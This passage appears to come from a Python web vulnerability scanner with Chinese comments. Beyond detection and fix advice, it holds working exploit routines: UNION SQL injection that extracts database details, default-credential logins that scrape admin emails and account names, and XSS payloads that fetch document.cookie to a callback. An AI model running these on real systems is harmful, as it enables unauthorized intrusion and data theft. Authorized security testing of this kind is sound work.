                        description=f"参数 {key} 注入 {payload!r} 后响应中出现系统文件特征。",
                        evidence=resp.url,
                        recommendation="对路径输入做白名单/规范化校验，禁止拼接文件路径。",
                        url=resp.url,
                    ))
                    break
            # 命令注入（时间盲注）
            for payload, label in CMD_TIME_PAYLOADS:
                params = {k: (payload if k == key else (v[0] if v else ""))
                          for k, v in qs.items()}
                resp = self._get(base, params=params)
                if resp is None:
                    continue
                if resp.elapsed.total_seconds() >= baseline + SQL_TIME_THRESHOLD:
                    self.report.add(Finding(
                        title="疑似命令注入（时间盲注）",
                        severity="critical",
                        description=f"参数 {key} 注入 {payload!r}（{label}）后响应耗时 "
                                    f"{resp.elapsed.total_seconds():.1f}s（基准 {baseline:.1f}s）。",
                        evidence=resp.url,
                        recommendation="禁止将用户输入传给 shell/系统调用，使用参数化 API。",
                        url=resp.url,
                    ))
                    break
            # CRLF / HTTP 头注入
            for payload in CRLF_PAYLOADS:
                params = {k: (payload if k == key else (v[0] if v else ""))
                          for k, v in qs.items()}
                resp = self._get(base, params=params)
                if resp is None:
                    continue
                # 若响应头中出现我们注入的头，说明回车换行未被过滤
                if any(h.lower() == "x-header" for h in resp.headers) or \
                   "X-Header: injected" in str(resp.headers):
                    self.report.add(Finding(
                        title="疑似 CRLF / HTTP 响应头注入",
                        severity="high",
                        description=f"参数 {key} 注入 {payload!r} 后，注入的头部出现在响应中，"
                                    f"说明 CRLF 未被过滤，可注入 Set-Cookie / 重定向等。",
                        evidence=resp.url,
                        recommendation="过滤 / 拒绝包含 CR(\\r) LF(\\n) 的输入，禁用反射到响应头。",
                        url=resp.url,
                    ))
                    break

    # -- XSS 探测 -------------------------------------------------------

    def test_xss(self, base_resp: requests.Response, url: str = "") -> None:
        target = url or self.url
        parsed = urlparse(target)
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query, keep_blank_values=True)
            base = target.split("?")[0]
            for key in qs:
                for probe in XSS_PROBES:
                    params = {k: (probe if k == key else (v[0] if v else ""))
                              for k, v in qs.items()}
                    resp = self._get(base, params=params)
                    if resp and XSS_REFLECT_RE.search(resp.text):
                        self.report.add(Finding(
                            title="疑似反射型 XSS（参数反射）",
                            severity="high",
                            description=f"参数 {key} 的探测串 {probe!r} 被回显到响应中，疑似未做 HTML 编码。",
                            evidence=resp.url,
                            recommendation="对输出进行 HTML 编码，配置 CSP 并使用 HttpOnly Cookie。",
                            url=resp.url,
                        ))
                        break
        # 表单字段反射型 XSS（GET 表单）
        forms = self.parse_forms(base_resp.text)
        for form in forms:
            if form.method != "get" or not form.fields:
                continue
            for probe in XSS_PROBES[:4]:
                params = {name: probe for name, _ in form.fields if name}
                if not params:
                    continue
                resp = self._get(form.action, params=params)
                if resp and XSS_REFLECT_RE.search(resp.text):
                    self.report.add(Finding(
                        title="疑似反射型 XSS（表单字段反射）",
                        severity="high",
                        description=f"表单字段提交 {probe!r} 后被回显到响应中。",
                        evidence=resp.url,
                        recommendation="对输出进行 HTML 编码，配置 CSP。",
                        url=resp.url,
                    ))
                    break

    # -- 弱口令 / 用户枚举 ---------------------------------------------

    def _login_field_names(self, form: "FormInfo") -> tuple[Optional[str], Optional[str]]:
        """从表单字段推断用户名/密码字段名。"""
        user, pwd = None, None
        for name, ftype in form.fields:
            if not name:
                continue
            low = name.lower()
            if ftype == "password" or low in ("password", "passwd", "pwd", "pass"):
                pwd = pwd or name
            elif low in ("user", "username", "user_name", "account", "login",
                         "email", "mail", "name", "userid"):
                user = user or name
        # 兜底：剩余的文本字段当作用户名
        if user is None:
            for name, ftype in form.fields:
                if name and ftype in ("text", "email", "") and name != pwd:
                    user = name
                    break
        return user, pwd

    def test_default_creds(self, forms: list["FormInfo"]) -> None:
        login_forms = [f for f in forms if f.is_login_like]
        if not login_forms:
            return
        for form in login_forms:
            if self._cancelled():
                return
            user_f, pwd_f = self._login_field_names(form)
            if not user_f or not pwd_f:
                continue
            # 取一个基准“登录失败”响应，用于判断成功
            baseline = self._send_form(form, "zzz_probe_invalid")  # 触发失败页
            baseline_body = baseline.text.lower() if baseline else ""
            for u, p in DEFAULT_CREDS:
                if self._cancelled():
                    return
                data = {n: "test" for n, _ in form.fields if n}
                data[user_f] = u
                data[pwd_f] = p
                resp = self._post(form.action, data=data) if form.method == "post" \
                    else self._get(form.action, params=data)
                if resp is None:
                    continue
                body = resp.text.lower()
                # 判定成功的特征：跳转 / 退出登录链接 / 无“登录失败”字样且长度显著变化
                success = False
                if any(k in body for k in ("logout", "log out", "logoff", "退出登录",
                                           "欢迎", "welcome", "我的账户", "dashboard")):
                    success = True
                elif "incorrect" not in body and "invalid" not in body and \
                     "失败" not in body and "错误" not in body and "wrong" not in body:
                    # 响应与失败基准差异显著且未跳回登录页
                    if abs(len(body) - len(baseline_body)) > 200 and "login" not in body \
                       and resp.status_code in (200, 302):
                        success = True
                if success and (resp.status_code == 302 or "login" not in body or
                                "logout" in body):
                    self.report.add(Finding(
                        title="疑似弱口令 / 默认凭据",
                        severity="critical",
                        description=f"使用默认凭据 {u}:{p} 提交后疑似登录成功"
                                    f"（状态码 {resp.status_code}，长度 {len(body)} B）。",
                        evidence=f"表单 #{form.index} action={form.action} 用户字段={user_f}",
                        recommendation="强制密码复杂度策略，禁用默认凭据，启用锁定/限流。",
                        url=form.action,
                    ))
                    self.confirmed_creds.append((form, user_f, pwd_f, u, p))
                    break
            # 用户名枚举：合法名 vs 不存在名 的响应差异
            if not self._cancelled():
                self._test_user_enum(form, user_f, pwd_f)

    def _test_user_enum(self, form, user_f, pwd_f) -> None:
        r1 = self._send_form(form, USER_ENUM_PROBES[0])  # 不存在的用户
        r2 = self._send_form(form, USER_ENUM_PROBES[1])   # admin
        if r1 is None or r2 is None:
            return
        b1, b2 = r1.text.lower(), r2.text.lower()
        # 若两次错误提示不同（如“用户不存在” vs “密码错误”），则可枚举
        diff = abs(len(b1) - len(b2)) / max(len(b1), len(b2), 1)
        fail_kw = ("incorrect", "invalid", "失败", "错误", "wrong", "does not exist",
                   "不存在", "not found", "密码错误")
        msgs = []
        for kw in fail_kw:
            in1, in2 = kw in b1, kw in b2
            if in1 != in2:
                msgs.append(kw)
        if msgs and diff > 0.02:
            self.report.add(Finding(
                title="疑似用户名枚举",
                severity="medium",
                description=f"不存在用户与“admin”的错误提示存在差异"
                            f"（差异关键词：{','.join(msgs[:3])}），可据此枚举有效用户。",
                evidence=f"表单 #{form.index} action={form.action}",
                recommendation="统一登录失败提示（如“用户名或密码错误”），避免差异化返回。",
                url=form.action,
            ))

    # -- 漏洞利用 / 后台取证 -------------------------------------------
    #
    # ⚠️ 以下方法属于主动利用，会实际提交利用载荷 / 用已知凭据登录，
    #    仅在已获书面授权时启用。所有操作为只读探测，不执行写操作。

    def attempt_exploitation(self) -> None:
        """对已确认的漏洞尝试利用取证（提取信息 / 进入后台）。"""
        has_vuln = (self.confirmed_sqli or self.confirmed_param_sqli or self.confirmed_creds)
        if not has_vuln and not self.do_xss:
            self._log("[*] 未发现可确认的可利用漏洞，跳过利用取证。")
            return
        # 1) SQL 注入 -> UNION 提取数据库信息（按 表单+字段 去重）
        seen_sqli = set()
        for form, field in self.confirmed_sqli:
            key = (form.index, field)
            if key in seen_sqli or self._cancelled():
                continue
            seen_sqli.add(key)
            self._exploit_sqli_union(form, field)
        # 1b) GET 参数 SQL 注入 -> UNION 提取
        seen_param = set()
        for base, key, qs in self.confirmed_param_sqli:
            if key in seen_param or self._cancelled():
                continue
            seen_param.add(key)
            self._exploit_param_sqli_union(base, key, qs)
        # 2) 默认/弱口令 -> 登录后台抓取信息（按 表单+凭据 去重）
        seen_creds = set()
        for form, user_f, pwd_f, u, p in self.confirmed_creds:
            key = (form.index, u, p)
            if key in seen_creds or self._cancelled():
                continue
            seen_creds.add(key)
            self._exploit_creds_login(form, user_f, pwd_f, u, p)
        # 3) XSS 执行验证（headless 浏览器 + 本地回调，仅授权目标）
        if self.do_xss and not self._cancelled():
            self.verify_xss()

    def _exploit_sqli_union(self, form: "FormInfo", field: str) -> None:
        """基于 UNION 的数据提取：定位可回显列并提取版本/库/用户等只读信息。"""
        ev = ExploitEvidence(
            technique="SQL 注入 UNION 提取",
            target=f"表单 #{form.index} 字段 {field} @ {form.action}",
            url=form.action,
        )
        marker = "vscan8f3a"
        # 1) 枚举列数 + 定位可回显列
        col_count = None
        reflect_col = None
        for n in range(1, 13):
            if self._cancelled():
                ev.excerpt = "用户中断"; return self._record(ev)
            cols = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {cols} -- -"
            resp = self._send_form_single(form, field, payload)
            if resp is None:
                continue
            # 列数正确时 UNION 不报错（与基准页面长度接近或不再含 SQL 错误）
            if not SQL_ERROR_RE.search(resp.text) and resp.status_code == 200:
                col_count = n
                break
        if not col_count:
            ev.excerpt = "未能确定查询列数（UNION 不可用或被过滤）。"
            return self._record(ev)
        # 2) 在每一列投放标记，定位可回显列
        for i in range(col_count):
            if self._cancelled():
                ev.excerpt = "用户中断"; return self._record(ev)
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}{i}'"
            payload = f"' UNION SELECT {','.join(cols)} -- -"
            resp = self._send_form_single(form, field, payload)
            if resp and f"{marker}{i}" in resp.text:
                reflect_col = i
                break
        if reflect_col is None:
            reflect_col = 0  # 兜底用第 0 列
        # 3) 利用回显列提取只读信息（MySQL / 兼容方言）
        base_resp = self._send_form_single(form, field, "1")
        base_text = base_resp.text if base_resp else ""
        def _extract(expr: str, label: str) -> str:
            cols = ["NULL"] * col_count
            cols[reflect_col] = expr
            payload = f"' UNION SELECT {','.join(cols)} -- -"
            resp = self._send_form_single(form, field, payload)
            return self._diff_extract(base_text, resp)
        extracted = {}
        for expr, label in [
            ("version()", "DBMS 版本"),
            ("database()", "当前数据库"),
            ("current_user()", "当前用户"),
            ("@@hostname", "主机名"),
            ("sqlite_version()", "SQLite 版本"),
        ]:
            val = _extract(expr, label)
            if val:
                extracted[label] = val
        # 4) 尝试列出当前库的表（仅前若干张，只读）
        cols = ["NULL"] * col_count
        cols[reflect_col] = "group_concat(table_name)"
        payload = f"' UNION SELECT {','.join(cols)} FROM information_schema.tables "
        payload += f"WHERE table_schema=database() -- -"
        resp = self._send_form_single(form, field, payload)
        tables = self._diff_extract(base_text, resp)
        if tables:
            extracted["数据表(部分)"] = tables
        ev.success = bool(extracted)
        ev.data = extracted
        ev.excerpt = "; ".join(f"{k}={v}" for k, v in extracted.items()) if extracted \
            else "UNION 可执行但未能提取到明文信息。"
        return self._record(ev)

    def _exploit_param_sqli_union(self, base: str, key: str, qs: dict) -> None:
        """对 GET 参数的 SQL 注入做 UNION 提取（列数定位 + 回显提取）。"""
        ev = ExploitEvidence(
            technique="GET 参数 SQL 注入 UNION 提取",
            target=f"参数 {key} @ {base}",
            url=base,
        )
        marker = "vscan7b2c"

        def _send(payload: str):
            params = {k: (payload if k == key else (v[0] if v else ""))
                      for k, v in qs.items()}
            return self._get(base, params=params)

        # 1) 列数：逐个试 UNION SELECT NULL,... 直到不报错
        col_count = None
        for n in range(1, 13):
            if self._cancelled():
                ev.excerpt = "用户中断"; return self._record(ev)
            cols = ",".join(["NULL"] * n)
            resp = _send(f"1 UNION SELECT {cols} -- -")
            if resp and not SQL_ERROR_RE.search(resp.text) and resp.status_code == 200:
                col_count = n
                break
        if not col_count:
            ev.excerpt = "未能确定查询列数（UNION 不可用或被过滤）。"
            return self._record(ev)
        # 2) 定位可回显列
        reflect_col = None
        for i in range(col_count):
            if self._cancelled():
                ev.excerpt = "用户中断"; return self._record(ev)
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}{i}'"
            resp = _send(f"1 UNION SELECT {','.join(cols)} -- -")
            if resp and f"{marker}{i}" in resp.text:
                reflect_col = i
                break
        if reflect_col is None:
            reflect_col = 0
        # 3) 提取只读信息（与基准响应做 diff，DB 无关）
        base_resp = _send("1")
        base_text = base_resp.text if base_resp else ""
        extracted = {}
        for expr, label in [
            ("version()", "DBMS 版本"),
            ("database()", "当前数据库"),
            ("current_user()", "当前用户"),
            ("@@hostname", "主机名"),
            ("sqlite_version()", "SQLite 版本"),
        ]:
            cols = ["NULL"] * col_count
            cols[reflect_col] = expr
            resp = _send(f"1 UNION SELECT {','.join(cols)} -- -")
            val = self._diff_extract(base_text, resp)
            if val:
                extracted[label] = val
        # 4) 列表
        cols = ["NULL"] * col_count
        cols[reflect_col] = "group_concat(table_name)"
        resp = _send(f"1 UNION SELECT {','.join(cols)} FROM information_schema.tables "
                     f"WHERE table_schema=database() -- -")
        tables = self._diff_extract(base_text, resp)
        if tables:
            extracted["数据表(部分)"] = tables
        ev.success = bool(extracted)
        ev.data = extracted
        ev.excerpt = "; ".join(f"{k}={v}" for k, v in extracted.items()) if extracted \
            else "UNION 可执行但未能提取到明文信息。"
        return self._record(ev)

    def _exploit_creds_login(self, form: "FormInfo", user_f: str,
                             pwd_f: str, user: str, pwd: str) -> None:
        """用已确认凭据登录，跟随跳转进入后台并抓取可见信息。"""
        ev = ExploitEvidence(
            technique="默认/弱口令登录后台",
            target=f"凭据 {user}:{pwd} @ {form.action}",
            url=form.action,
        )
        data = {n: "test" for n, _ in form.fields if n}
        data[user_f] = user
        data[pwd_f] = pwd
        resp = self._post(form.action, data=data) if form.method == "post" \
            else self._get(form.action, params=data)
        if resp is None:
            ev.excerpt = "登录请求失败。"
            return self._record(ev)
        # 抓取会话 Cookie 名称
        cookies = [c.name for c in self.session.cookies]
        info = {}
        if cookies:
            info["会话Cookie"] = ", ".join(cookies[:5])
        # 跟随后台页面（若存在重定向 / 后台链接）
        backend_urls = self._extract_backend_links(resp)
        info["跳转URL"] = resp.url
        info["后台链接(部分)"] = ", ".join(backend_urls[:8]) if backend_urls else "未发现明显后台链接"
        # 抓取后台可见的敏感信息：邮箱 / 用户名 / 配置项
        emails = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", resp.text)))[:10]
        if emails:
            info["页面邮箱"] = ", ".join(emails)
        # 跟进首个后台链接抓取更多内容
        excerpt_parts = []
        for burl in backend_urls[:2]:
            if self._cancelled():
                break
            sub = self._get(burl)
            if sub:
                emails2 = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", sub.text)))[:10]
                if emails2:
                    info.setdefault("后台邮箱", []).extend(emails2)
                # 抓取疑似用户名列表（如表格中的列）
                users = re.findall(r">([A-Za-z0-9_.\-]{3,30})<", sub.text)
                uniq = sorted({u for u in users if u.lower() not in
                               ("div", "span", "html", "body", "script", "input", "button")})[:12]
                if uniq:
                    info["疑似账号名"] = ", ".join(uniq)
                excerpt_parts.append(self._sanitize(sub.text)[:400])
        ev.success = True
        ev.data = info
        ev.excerpt = " ".join(excerpt_parts)[:600] if excerpt_parts else \
            ("登录成功，已建立会话：" + "; ".join(f"{k}={v}" for k, v in info.items()))
        return self._record(ev)

    # -- XSS 执行验证（headless + 本地回调） --------------------------
    #
    # ⚠️ 仅在授权目标上启用。扫描器用自身 headless 浏览器访问目标，
    #    回调仅发往 127.0.0.1（本机），不涉及任何第三方 / 真实用户。

    def _xss_payloads(self) -> list:
        """返回带 {u} 占位符的可执行 XSS 载荷模板（回连地址在调用时填入）。"""
        return [
            # HTML 正文上下文
            "<img src=x onerror=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
            "<script>fetch('{u}&c='+encodeURIComponent(document.cookie))</script>",
            "<svg onload=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
            # 属性 / 双引号闭合上下文
            "\"><img src=x onerror=\"fetch('{u}&c='+encodeURIComponent(document.cookie))\">",
            "javascript:fetch('{u}')",
        ]

    def verify_xss(self) -> None:
        """对 URL 参数与 GET 表单字段，用 headless 浏览器验证 XSS 是否真正执行。"""
        try:
            from selenium import webdriver
            from selenium.webdriver.edge.options import Options
        except Exception:
            self._log("[*] 未安装 selenium，跳过 XSS 执行验证（仅保留反射检测）。")
            return

        # 1) 启动本地回调服务器
        from http.server import BaseHTTPRequestHandler, HTTPServer
        from urllib.parse import urlparse as _up, parse_qs as _pqs
        hits: dict = {}

        class _CB(BaseHTTPRequestHandler):
            def do_GET(self):
                q = _pqs(_up(self.path).query)
                tid = (q.get("id") or [""])[0]
                cookie = (q.get("c") or [""])[0]
                ua = self.headers.get("User-Agent", "")
                if tid:
                    hits[tid] = {"cookie": cookie, "ua": ua, "path": self.path}
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, *a):
                pass

        try:
            srv = HTTPServer(("127.0.0.1", 0), _CB)
            port = srv.server_address[1]
            srv_thread = threading.Thread(target=srv.serve_forever, daemon=True)
            srv_thread.start()
            cb_base = f"http://127.0.0.1:{port}"
        except Exception as e:
            self._log(f"[*] 回调服务器启动失败：{e}，跳过 XSS 执行验证。")
            return

        # 2) 启动 headless Edge
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-extensions")
        try:
            driver = webdriver.Edge(options=opts)
        except Exception as e:
            self._log(f"[*] headless 浏览器启动失败：{e}，跳过 XSS 执行验证。")
            srv.shutdown()
            return

        # 3) 收集待测注入点（URL 参数 + GET 表单字段）
        targets = []  # (label, url_builder(payload))
        parsed = urlparse(self.url)
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query, keep_blank_values=True)
            base = self.url.split("?")[0]
            for key in qs:
                def build(p, key=key, qs=qs, base=base):
                    params = {k: (p if k == key else (v[0] if v else ""))
                              for k, v in qs.items()}
                    return requests.Request("GET", base, params=params).prepare().url
                targets.append((f"参数 {key}", build))
        # GET 表单字段
        resp0 = self._get(self.url)
        if resp0:
            forms = self.parse_forms(resp0.text)
            for form in forms:
                if form.method != "get":
                    continue
                for name, _ in form.fields:
                    if not name:
                        continue
                    def build(p, form=form, name=name):
                        params = {n: (p if n == name else "x") for n, _ in form.fields if n}
                        return requests.Request("GET", form.action, params=params).prepare().url
                    targets.append((f"表单字段 {name}", build))

        if not targets:
            driver.quit(); srv.shutdown()
            self._log("[*] 无可测试的反射注入点，跳过 XSS 执行验证。")
            return

        # 4) 逐个注入点逐个载荷，headless 加载并等待回调
        verified = 0
        templates = self._xss_payloads()
        for label, build in targets:
            if self._cancelled():
                break
            for idx, tmpl in enumerate(templates):
                tag = f"t{verified}_{idx}"
                payload = tmpl.format(u=f"{cb_base}/?id={tag}")
                try:
                    poc_url = build(payload)
                    driver.get(poc_url)
                except Exception:
                    continue
                # 等待回调（JS 执行 + 网络回连）
                for _ in range(8):
                    if tag in hits or self._cancelled():
                        break
                    time.sleep(0.3)
                if tag in hits:
                    info = hits[tag]
                    cookie = info["cookie"]
                    ev = ExploitEvidence(
                        technique="XSS 执行验证（headless + 本地回调）",
                        target=f"{label} @ {self.url}",
                        success=True,
                        data={
                            "注入点": label,
                            "PoC URL": poc_url,
                            "回连": f"{cb_base}{info['path']}",
                            "捕获Cookie": cookie[:120] if cookie else "（无/HttpOnly）",
                            "UA": info["ua"][:80],
                        },
                        excerpt=f"载荷在 headless 浏览器中真实执行并触发回连。"
                                f"{'已读取 document.cookie（' + cookie[:40] + '…）' if cookie else '未读到 cookie（可能 HttpOnly）'}",
                        url=poc_url,
                    )
                    self.report.add(Finding(
                        title="确认 XSS（执行验证）",
                        severity="high",
                        description=f"{label} 注入可执行载荷后，在 headless 浏览器中真实执行并回连本地服务器"
                                    f"{'，可读取 document.cookie' if cookie else '（cookie 为 HttpOnly 未读取）'}。",
                        evidence=poc_url,
                        recommendation="对输出做上下文相关编码（HTML/属性/JS），启用 CSP，会话 Cookie 设为 HttpOnly+Secure+SameSite。",
                        url=poc_url,
                    ))
                    self._record(ev)
                    verified += 1
                    break
            else:
                continue
            # 命中即处理下一个注入点

        try:
            driver.quit()
        except Exception:
            pass
        srv.shutdown()
        if verified == 0:
            self._log("[*] XSS 执行验证：未触发任何回连（载荷未执行或被过滤）。")
        else:
            self._log(f"[*] XSS 执行验证完成，确认 {verified} 个可执行 XSS 点。")

    def _extract_backend_links(self, resp: requests.Response) -> list:
        """从响应中抽取疑似后台/管理链接。"""
        soup = BeautifulSoup(resp.text, "html.parser")
        kw = ("admin", "dashboard", "manage", "console", "panel", "user",
              "account", "profile", "config", "settings", "wp-admin")
        found = []
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if any(k in href.lower() for k in kw):
                found.append(urljoin(resp.url, href))
        # 去重保序
        seen, out = set(), []
        for u in found:
            if u not in seen:
                seen.add(u)
                out.append(u)
        return out

    @staticmethod
    def _sanitize(text: str) -> str:
        """压缩空白并截断，便于呈现。"""
        text = re.sub(r"<script.*?</script>", " ", text, flags=re.S | re.I)
        text = re.sub(r"<style.*?</style>", " ", text, flags=re.S | re.I)
        text = re.sub(r"<[^>]+>", " ", text)
        return re.sub(r"\s+", " ", text).strip()

    def _diff_extract(self, baseline_text: str, resp) -> str:
        """从注入响应里提取“新增”文本（相对基准），DB 无关、抗 HTML 干扰。"""
        if not resp:
            return ""
        u = self._sanitize(resp.text)
        b = self._sanitize(baseline_text) if baseline_text else ""
        bset = set(re.findall(r"\S+", b))
        diff = [w for w in re.findall(r"\S+", u) if w not in bset]
        return " ".join(diff)[:120].strip()

    def _record(self, ev: ExploitEvidence) -> None:
        self.report.exploits.append(ev)
        status = "成功" if ev.success else "未成功"
        self._log(f"    [利用] {ev.technique} → {status}：{ev.excerpt[:80]}")

    # -- SSTI / SSRF / 开放重定向 / 文件上传 --------------------------

    # SSTI 探测：注入模板表达式，检测数学运算结果是否被求值回显
    SSTI_PROBES = [
        ("{{49*49}}", "2401"),   # Jinja2 / Twig / Tornado
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),        # FreeMarker / Velocity
        ("<%=7*7%>", "49"),      # ERB
        ("#{7*7}", "49"),        # Ruby / Spring
        ("{7*7}", "49"),         # Smarty
    ]

    def test_ssti(self, url: str, forms: list) -> None:
        target = url or self.url
        parsed = urlparse(target)
        # GET 参数
        if parsed.query:
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query, keep_blank_values=True)
            base = target.split("?")[0]
            for key in qs:
                if self._cancelled():
                    return
                for payload, expect in self.SSTI_PROBES:
                    params = {k: (payload if k == key else (v[0] if v else ""))
                              for k, v in qs.items()}
                    resp = self._get(base, params=params)
                    if resp and expect in resp.text and payload not in resp.text:
                        self.report.add(Finding(
                            title="疑似 SSTI（服务端模板注入）",
                            severity="high",
                            description=f"参数 {key} 注入 {payload!r} 后响应出现求值结果 {expect}，"
                                        f"模板表达式被执行。",
                            evidence=resp.url,
                            recommendation="模板引擎使用沙箱/自动转义，禁止渲染用户输入，禁用危险函数。",
                            url=resp.url,
                        ))
                        break
        # 表单字段
        for form in forms:
            if self._cancelled():
                return
            field = self._injectable_field(form)
            if not field:
                continue
            for payload, expect in self.SSTI_PROBES:
                resp = self._send_form_single(form, field, payload)
                if resp and expect in resp.text and payload not in resp.text:
                    self.report.add(Finding(
                        title="疑似 SSTI（服务端模板注入）",
                        severity="high",
                        description=f"表单字段 {field} 注入 {payload!r} 后响应出现求值结果 {expect}。",
                        evidence=f"表单 #{form.index} action={form.action}",
                        recommendation="模板引擎使用沙箱/自动转义，禁止渲染用户输入。",
                        url=form.action,
                    ))
                    break

    def _start_callback(self):
        """启动本机回调服务器，返回 (srv, port, hits)。"""
        from http.server import BaseHTTPRequestHandler, HTTPServer
        from urllib.parse import urlparse as _up, parse_qs as _pqs
        hits: dict = {}

        class _CB(BaseHTTPRequestHandler):
            def do_GET(self):
                q = _pqs(_up(self.path).query)
                tid = (q.get("id") or [""])[0]
                if tid:
                    hits[tid] = {"path": self.path, "ua": self.headers.get("User-Agent", "")}
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, *a):
                pass

        srv = HTTPServer(("127.0.0.1", 0), _CB)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv, srv.server_address[1], hits

    def test_ssrf(self, url: str) -> None:
        """注入本机回调 URL，探测服务端是否发起外联请求（SSRF）。"""
        target = url or self.url
        parsed = urlparse(target)
        if not parsed.query:
            return
        from urllib.parse import parse_qs
        qs = parse_qs(parsed.query, keep_blank_values=True)
        base = target.split("?")[0]
        try:
            srv, port, hits = self._start_callback()
        except Exception as e:
            self._log(f"[*] SSRF 回调服务器启动失败：{e}")
            return
        cb = f"http://127.0.0.1:{port}"
        payloads = [cb, "http://localhost:{port}", f"http://127.0.0.1:{port}"]
        found = False
        for key in qs:
            if self._cancelled():
                break
            for idx, p in enumerate(payloads):
                tag = f"ssrf_{key}_{idx}"
                full_cb = f"{cb}/?id={tag}"
                val = p.replace("{port}", str(port)) if "{port}" in p else full_cb
                params = {k: (val if k == key else (v[0] if v else "")) for k, v in qs.items()}
                # 关键：不跟随跳转，避免扫描器自身跟随 302 命中回调造成误报
                try:
                    self.session.get(base, params=params, timeout=self.timeout,
                                     allow_redirects=False)
                except requests.RequestException:
                    continue
            # 等待回调
            for _ in range(10):
                if any(k.startswith(f"ssrf_{key}_") for k in hits) or self._cancelled():
                    break
                time.sleep(0.3)
            hit_tags = [k for k in hits if k.startswith(f"ssrf_{key}_")]
            if hit_tags:
                ev = ExploitEvidence(
                    technique="SSRF 服务端请求伪造",
                    target=f"参数 {key} @ {target}",
                    success=True,
                    data={"注入点": key, "回连": cb + hits[hit_tags[0]]["path"],
                          "UA": hits[hit_tags[0]]["ua"][:80]},
                    excerpt=f"参数 {key} 注入本机回调 URL 后，服务端发起了对 {cb} 的请求。",
                    url=target,
                )
                self.report.add(Finding(
                    title="疑似 SSRF（服务端请求伪造）",
                    severity="critical",
                    description=f"参数 {key} 注入本机回调 URL 后，服务端发起了对 {cb} 的外联请求。",
                    evidence=target,
                    recommendation="对服务端获取的 URL 做白名单/内网地址过滤，禁用 file:// 等协议。",
                    url=target,
                ))
                self._record(ev)
                found = True
                break
        srv.shutdown()
        if not found:
            self._log("[*] SSRF 探测：未观察到服务端外联回连。")

    REDIRECT_TARGETS = [
        "https://vulnscan-redirect.example/",
        "//vulnscan-redirect.example/",
        "https://vulnscan-redirect.example/",
    ]

    def test_open_redirect(self, url: str) -> None:
        """注入外部跳转目标，检测响应是否跳转到外部域（开放重定向）。"""
        target = url or self.url
        parsed = urlparse(target)
        if not parsed.query:
            return
        from urllib.parse import parse_qs
        qs = parse_qs(parsed.query, keep_blank_values=True)
        base = target.split("?")[0]
        marker = "vulnscan-redirect.example"
        for key in qs:
            if self._cancelled():
                return
            for payload in self.REDIRECT_TARGETS:
                params = {k: (payload if k == key else (v[0] if v else "")) for k, v in qs.items()}
                # 不跟随跳转，直接看 Location 头
                try:
                    resp = self.session.get(base, params=params, timeout=self.timeout,
                                            allow_redirects=False)
                except requests.RequestException:
                    continue
                loc = resp.headers.get("Location", "")
                if marker in loc:
                    self.report.add(Finding(
                        title="疑似开放重定向",
                        severity="medium",
                        description=f"参数 {key} 注入外部 URL 后，响应 Location 头跳转到 {loc[:80]}。",
                        evidence=f"Location: {loc[:120]}",
                        recommendation="对重定向目标做白名单校验，禁止跳转到外部域。",
                        url=resp.url,
                    ))
                    break

    def test_file_upload(self, forms: list, url: str) -> None:
        """检测文件上传表单；授权模式下探测良性上传是否被接受。"""
        upload_forms = []
        for form in forms:
            if any(ftype == "file" for _, ftype in form.fields):
                upload_forms.append(form)
        if not upload_forms:
            return
        for form in upload_forms:
            self.report.add(Finding(
                title="存在文件上传功能",
                severity="medium",
                description=f"表单 #{form.index} 含文件上传字段（action={form.action}）。"
                            f"需人工确认是否限制类型/校验内容。",
                evidence=f"表单 #{form.index} action={form.action}",
                recommendation="校验文件类型/扩展名/内容，重命名存储，禁止可执行扩展名，单独域名/静态服务提供下载。",
                url=form.action,
            ))
            # 授权模式下探测良性上传
            if self.do_exploit and not self._cancelled():
                self._probe_upload(form, url)

    def _probe_upload(self, form: "FormInfo", page_url: str) -> None:
        """上传一个良性文本文件，检测是否被服务端接受/可访问。"""
        try:
            files = {"file": ("vulnscan_probe.txt", "vulnscan upload probe", "text/plain")}
        except Exception:
            return
        # 收集其他字段填中性值
        data = {n: "test" for n, ft in form.fields if n and ft != "file"}
        try:
            resp = self.session.post(form.action, data=data, files=files,
                                     timeout=self.timeout, allow_redirects=True)
        except requests.RequestException:
            return
        if resp is None:
            return
        body = (resp.text or "").lower()
        success_kw = ("upload", "成功", "success", "saved", "uploaded", "vulnscan_probe")
        accepted = resp.status_code in (200, 201) and any(k in body for k in success_kw)
        if accepted:
            ev = ExploitEvidence(
                technique="任意文件上传探测",
                target=f"表单 #{form.index} action={form.action}",
                success=True,
                data={"上传文件": "vulnscan_probe.txt", "状态码": str(resp.status_code),
                      "响应长度": str(len(resp.content))},
                excerpt="良性文本文件被服务端接受上传（仅证明可上传，未上传可执行文件）。",
                url=form.action,
            )
            self.report.add(Finding(
                title="疑似任意文件上传",
                severity="high",
                description=f"向表单上传良性文本文件后被服务端接受（状态码 {resp.status_code}）。"
                            f"需确认是否限制可执行扩展名。",
                evidence=form.action,
                recommendation="校验文件类型/扩展名/内容，重命名存储，禁止可执行扩展名。",
                url=form.action,
            ))
            self._record(ev)

    # -- 敏感路径探测 ---------------------------------------------------

    def probe_common_paths(self) -> None:
        for path in COMMON_PATHS:
            full = urljoin(self.url, path)
            resp = self._get(full)
            if resp is None:
                continue
            if resp.status_code == 200 and len(resp.content) > 0:
                # 排除通用首页误报
                if path in ("admin", "administrator", "wp-admin") and \
                   "login" not in resp.text.lower() and resp.status_code == 200:
                    continue
                high_value = (".env", ".git/config", ".git/HEAD", ".svn/entries",
